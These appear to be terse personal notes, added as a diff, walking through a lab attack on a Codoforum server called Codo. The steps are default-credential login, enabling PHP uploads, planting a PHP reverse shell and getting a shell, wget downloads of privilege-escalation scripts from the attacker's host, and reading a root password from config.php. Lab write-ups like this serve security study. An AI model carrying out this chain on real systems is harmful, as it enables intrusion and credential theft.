@@ -1,0 +1,36 @@
+192.168.221.23 Codo
+
+http://192.168.221.23/index.php?u=/
+login with default crdential admin:admin
+Codoforum it is.
+nothing found here 
+dirb http://192.168.221.23
+get /admin directory
+use same credential for login 
+got success
+found version :
+
+
+locate reverse | grep php
+ cp /usr/share/webshells/php/php-reverse-shell.php .
+mv php-reverse-shell.php shell.php
+vi shell.php 
+enter the kali linux ip address
+Got error to upload file 
+
+Error While uploading the image, try with a different image. 
+Global settings> Allowed Upload types(comma separated)
+add php
+I uploaded sucessfully
+
+http://192.168.221.23/sites/default/assets/img/attachments/shell.php
+
+Got reverse shell
+
+wget http://192.168.45.173:440/lse.sh
+chmod +x lse.sh
+wget http://192.168.45.173:440/linpeas.sh
+
+find credential at /var/www/html/sites/default/config.php
+root password FatPanda123
+
